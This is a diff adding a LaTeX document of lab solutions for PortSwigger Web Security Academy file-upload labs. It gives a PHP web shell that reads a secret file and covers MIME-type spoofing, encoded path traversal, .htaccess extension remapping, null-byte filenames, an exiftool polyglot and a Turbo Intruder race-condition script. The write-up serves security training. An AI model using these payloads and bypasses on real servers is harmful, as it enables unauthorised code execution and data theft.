@@ -1,0 +1,309 @@
+\documentclass[11pt,a4paper]{article}
+
+% ----------------------------------
+% Packages
+% ----------------------------------
+\usepackage[utf8]{inputenc}
+\usepackage[T1]{fontenc}
+\usepackage[a4paper,top=2.1cm,bottom=2.1cm,left=2.25cm,right=2.25cm]{geometry}
+\usepackage{xcolor}
+\usepackage{hyperref}
+\usepackage{enumitem}
+\usepackage{booktabs}
+\usepackage{array}
+\usepackage{titlesec}
+\usepackage{fancyhdr}
+\usepackage{listings}
+
+% ----------------------------------
+% Document information
+% ----------------------------------
+\newcommand{\DocumentType}{Lab Writeups}
+\newcommand{\VulnerabilityTitle}{File Upload Vulnerabilities}
+\newcommand{\SourceName}{PortSwigger Web Security Academy}
+\newcommand{\SourceURL}{https://portswigger.net/web-security/file-upload}
+\newcommand{\AuthorName}{Youssef Reda}
+
+% ----------------------------------
+% Colors and hyperlinks
+% ----------------------------------
+\definecolor{primary}{RGB}{25,55,95}
+\definecolor{secondary}{RGB}{75,95,120}
+\definecolor{linkblue}{RGB}{35,85,155}
+\definecolor{codegray}{RGB}{95,95,95}
+\definecolor{codebg}{RGB}{247,248,250}
+\definecolor{codeframe}{RGB}{210,216,224}
+\lstset{
+    basicstyle=\ttfamily\small,
+    backgroundcolor=\color{codebg},
+    frame=single,
+    rulecolor=\color{codeframe},
+    framesep=7pt,
+    xleftmargin=4pt,
+    xrightmargin=4pt,
+    aboveskip=8pt,
+    belowskip=8pt,
+    breaklines=true,
+    breakatwhitespace=false,
+    columns=fullflexible,
+    keepspaces=true,
+    showstringspaces=false,
+    tabsize=2
+}
+
+\hypersetup{
+    colorlinks=true,
+    linkcolor=primary,
+    urlcolor=linkblue,
+    citecolor=primary,
+    pdftitle={\VulnerabilityTitle\space - \DocumentType},
+    pdfauthor={\AuthorName}
+}
+
+\urlstyle{same}
+
+% ----------------------------------
+% Paragraphs, lists, and headings
+% ----------------------------------
+\setlength{\parindent}{0pt}
+\setlength{\parskip}{4pt}
+\setlist[itemize]{leftmargin=1.5em,itemsep=2pt,topsep=3pt}
+\setlist[enumerate]{leftmargin=1.8em,itemsep=2pt,topsep=3pt}
+\titleformat{\section}{\Large\bfseries\color{primary}}{}{0pt}{}
+\titleformat{\subsection}{\large\bfseries\color{secondary}}{}{0pt}{}
+\titleformat{\subsubsection}{\normalsize\bfseries}{}{0pt}{}
+\titlespacing*{\section}{0pt}{16pt}{6pt}
+\titlespacing*{\subsection}{0pt}{11pt}{4pt}
+\titlespacing*{\subsubsection}{0pt}{8pt}{3pt}
+
+% Unnumbered headings that still appear in the Table of Contents.
+\newcommand{\nsection}[1]{%
+    \section*{#1}%
+    \phantomsection%
+    \addcontentsline{toc}{section}{#1}%
+}
+\newcommand{\nsubsection}[1]{%
+    \subsection*{#1}%
+    \phantomsection%
+    \addcontentsline{toc}{subsection}{#1}%
+}
+\newcommand{\nsubsubsection}[1]{%
+    \subsubsection*{#1}%
+    \phantomsection%
+    \addcontentsline{toc}{subsubsection}{#1}%
+}
+
+% ----------------------------------
+% Header and footer
+% ----------------------------------
+\pagestyle{fancy}
+\fancyhf{}
+\fancyhead[L]{\small\textcolor{secondary}{Web Security Notes}}
+\fancyhead[R]{\small\textit{File Upload Labs}}
+\fancyfoot[C]{\thepage}
+\renewcommand{\headrulewidth}{0.4pt}
+\renewcommand{\footrulewidth}{0pt}
+\setlength{\headheight}{14pt}
+
+\begin{document}
+
+% ----------------------------------
+% Cover page
+% ----------------------------------
+\begin{titlepage}
+    \thispagestyle{empty}
+    \centering
+    \vspace*{1.8cm}
+    {\Large\color{secondary}\bfseries \DocumentType\par}
+    \vspace{1.2cm}
+    {\Huge\bfseries\color{primary}\VulnerabilityTitle\par}
+    \vspace{0.8cm}
+    {\large PortSwigger Web Security Academy --- Lab Solutions\par}
+    \vfill
+    \begin{flushleft}
+        \textbf{Prepared by}\par
+        \AuthorName
+    \end{flushleft}
+\end{titlepage}
+
+% ----------------------------------
+% Contents
+% ----------------------------------
+\pagenumbering{roman}
+\tableofcontents
+\clearpage
+\pagenumbering{arabic}
+
+% ----------------------------------
+% Lab solutions
+% ----------------------------------
+
+\nsection{Lab: Remote Code Execution via Web Shell Upload}
+
+\begin{enumerate}
+    \item Log in using \texttt{wiener:peter} and locate the avatar upload function.
+    \item Upload an arbitrary image, then return to the account page.
+    \item In Burp, open \textbf{Proxy > HTTP history}, filter by image MIME type, and identify the \texttt{GET /files/avatars/\textless YOUR-IMAGE\textgreater} request. Send it to Repeater.
+    \item Create \texttt{exploit.php} with the following payload:
+          \begin{lstlisting}[language=PHP]
+<?php echo file_get_contents('/home/carlos/secret'); ?>
+\end{lstlisting}
+    \item Upload \texttt{exploit.php} using the avatar upload function.
+    \item In Repeater, change the GET request path to:
+          \begin{lstlisting}
+GET /files/avatars/exploit.php HTTP/1.1
+\end{lstlisting}
+    \item Send the request, retrieve Carlos's secret from the response, and submit it in the lab banner.
+\end{enumerate}
+
+\nsection{Lab: Web Shell Upload via Content-Type Restriction Bypass}
+
+\begin{enumerate}
+    \item Log in using \texttt{wiener:peter}, upload an image as your avatar, and return to the account page.
+    \item In Burp Proxy history, identify the \texttt{GET /files/avatars/\textless YOUR-IMAGE\textgreater} request and send it to Repeater.
+    \item Create \texttt{exploit.php} with the payload:
+          \begin{lstlisting}[language=PHP]
+<?php echo file_get_contents('/home/carlos/secret'); ?>
+\end{lstlisting}
+    \item Attempt to upload the PHP file and note that the server only allows \texttt{image/jpeg} or \texttt{image/png} MIME types.
+    \item Find the \texttt{POST /my-account/avatar} request in Proxy history and send it to Repeater.
+    \item In the file part of the request body, change the \texttt{Content-Type} header to \texttt{image/jpeg}.
+    \item Send the modified request and confirm that the file is uploaded successfully.
+    \item In the GET request tab, replace the image filename with \texttt{exploit.php} and send the request.
+    \item Retrieve Carlos's secret from the response and submit it in the lab banner.
+\end{enumerate}
+
+\newpage
+\nsection{Lab: Web Shell Upload via Path Traversal}
+
+\begin{enumerate}
+    \item Log in using \texttt{wiener:peter}, upload an image as your avatar, and return to the account page.
+    \item Identify the \texttt{GET /files/avatars/\textless YOUR-IMAGE\textgreater} request in Burp Proxy history and send it to Repeater.
+    \item Create \texttt{exploit.php} with the payload:
+          \begin{lstlisting}[language=PHP]
+<?php echo file_get_contents('/home/carlos/secret'); ?>
+\end{lstlisting}
+    \item Upload the PHP file and request it through Repeater using \texttt{/files/avatars/exploit.php}. Observe that its source is returned as plain text.
+    \item Find the \texttt{POST /my-account/avatar} upload request in Proxy history and send it to Repeater.
+    \item In the file part, change the filename to:
+          \begin{lstlisting}
+Content-Disposition: form-data; name="avatar"; filename="../exploit.php"
+\end{lstlisting}
+    \item Send the request and observe that the traversal sequence is stripped from the filename.
+    \item URL-encode the forward slash and change the filename to:
+          \begin{lstlisting}
+filename="..%2fexploit.php"
+\end{lstlisting}
+    \item Send the request again and confirm that the response reflects the decoded traversal path.
+    \item Return to the account page. In Proxy history, find the GET request for \texttt{/files/avatars/..\%2fexploit.php} and inspect its response.
+    \item Retrieve Carlos's secret and submit it in the lab banner. The uploaded file can also be requested as \texttt{/files/exploit.php}.
+\end{enumerate}
+
+\newpage
+\nsection{Lab: Web Shell Upload via Extension Blacklist Bypass}
+
+\begin{enumerate}
+    \item Log in using \texttt{wiener:peter}, upload an image as your avatar, and return to the account page.
+    \item Identify the avatar GET request in Burp Proxy history and send it to Repeater.
+    \item Create \texttt{exploit.php} with the payload:
+          \begin{lstlisting}[language=PHP]
+<?php echo file_get_contents('/home/carlos/secret'); ?>
+\end{lstlisting}
+    \item Attempt to upload the PHP file and note that the server blocks the \texttt{.php} extension.
+    \item Find the \texttt{POST /my-account/avatar} request. Confirm from the response headers that the server is Apache, then send the request to Repeater.
+    \item In the file part of the request, make these changes:
+          \begin{itemize}
+              \item Set the filename to \texttt{.htaccess}.
+              \item Set the Content-Type to \texttt{text/plain}.
+              \item Replace the file contents with:
+                    \begin{lstlisting}
+AddType application/x-httpd-php .l33t
+\end{lstlisting}
+          \end{itemize}
+    \item Send the request to upload the \texttt{.htaccess} file.
+    \item Return to the original PHP upload request and change the filename from \texttt{exploit.php} to \texttt{exploit.l33t}. Send the request.
+    \item In the avatar GET request, replace the image filename with \texttt{exploit.l33t} and send it.
+    \item Retrieve Carlos's secret from the response and submit it in the lab banner.
+\end{enumerate}
+
+\newpage
+\nsection{Lab: Web Shell Upload via Obfuscated File Extension}
+
+\begin{enumerate}
+    \item Log in using \texttt{wiener:peter}, upload an image as your avatar, and return to the account page.
+    \item Identify the avatar GET request in Burp Proxy history and send it to Repeater.
+    \item Create \texttt{exploit.php} with the payload:
+          \begin{lstlisting}[language=PHP]
+<?php echo file_get_contents('/home/carlos/secret'); ?>
+\end{lstlisting}
+    \item Attempt to upload the PHP file and note that the server only allows JPG and PNG files.
+    \item Find the \texttt{POST /my-account/avatar} request and send it to Repeater.
+    \item In the file part, change the filename to include an encoded null byte followed by a JPG extension:
+          \begin{lstlisting}
+filename="exploit.php%00.jpg"
+\end{lstlisting}
+    \item Send the request and confirm that the response identifies the uploaded file as \texttt{exploit.php}.
+    \item In the avatar GET request, replace the image filename with \texttt{exploit.php} and send it.
+    \item Retrieve Carlos's secret from the response and submit it in the lab banner.
+\end{enumerate}
+
+\nsection{Lab: Remote Code Execution via Polyglot Web Shell Upload}
+
+\begin{enumerate}
+    \item Create \texttt{exploit.php} with the payload:
+          \begin{lstlisting}[language=PHP]
+<?php echo file_get_contents('/home/carlos/secret'); ?>
+\end{lstlisting}
+    \item Log in using \texttt{wiener:peter} and attempt to upload the PHP file as your avatar. Confirm that non-image files are blocked.
+    \item Create a PHP/JPG polyglot by embedding the payload in the image's metadata using ExifTool:
+          \begin{lstlisting}[language=bash]
+exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" <YOUR-INPUT-IMAGE>.jpg -o polyglot.php
+\end{lstlisting}
+    \item Upload \texttt{polyglot.php} as your avatar and return to the account page.
+    \item In Burp Proxy history, find the \texttt{GET /files/avatars/polyglot.php} request and inspect its response.
+    \item Search the response body for \texttt{START} and read Carlos's secret between the \texttt{START} and \texttt{END} markers.
+    \item Submit the secret in the lab banner.
+\end{enumerate}
+
+\newpage
+\nsection{Lab: Web Shell Upload via Race Condition}
+
+\begin{enumerate}
+    \item Log in using \texttt{wiener:peter}, upload an image as your avatar, and return to the account page.
+    \item Identify the avatar GET request in Burp Proxy history.
+    \item Create \texttt{exploit.php} with the payload:
+          \begin{lstlisting}[language=PHP]
+<?php echo file_get_contents('/home/carlos/secret'); ?>
+\end{lstlisting}
+    \item Attempt to upload the PHP file and confirm that normal validation blocks it.
+    \item Install the Turbo Intruder extension from the Burp BApp Store if it is not already installed.
+    \item Right-click the \texttt{POST /my-account/avatar} request in Proxy history and select \textbf{Extensions > Turbo Intruder > Send to turbo intruder}.
+    \item Use the following script template in Turbo Intruder, replacing the placeholders with the complete POST upload request and the GET request for \texttt{/files/avatars/exploit.php}:
+          \begin{lstlisting}[language=Python]
+def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=10,)
+
+    request1 = '''<YOUR-POST-REQUEST>'''
+    request2 = '''<YOUR-GET-REQUEST>'''
+
+    # The 'gate' argument blocks the final byte of each request until openGate is invoked.
+    engine.queue(request1, gate='race1')
+    for x in range(5):
+        engine.queue(request2, gate='race1')
+
+    # Release all queued requests together.
+    engine.openGate('race1')
+    engine.complete(timeout=60)
+
+
+def handleResponse(req, interesting):
+    table.add(req)
+\end{lstlisting}
+    \item Replace \texttt{<YOUR-POST-REQUEST>} with the full POST request containing \texttt{exploit.php}.
+    \item Replace \texttt{<YOUR-GET-REQUEST>} with the GET request for \texttt{/files/avatars/exploit.php}.
+    \item Click \textbf{Attack}. Turbo Intruder sends the upload request followed by five GET requests.
+    \item Inspect the results for a GET response with status \texttt{200} containing Carlos's secret. This request reached the file before validation failed and the file was deleted.
+    \item Submit the secret in the lab banner.
+\end{enumerate}
+
+\end{document}
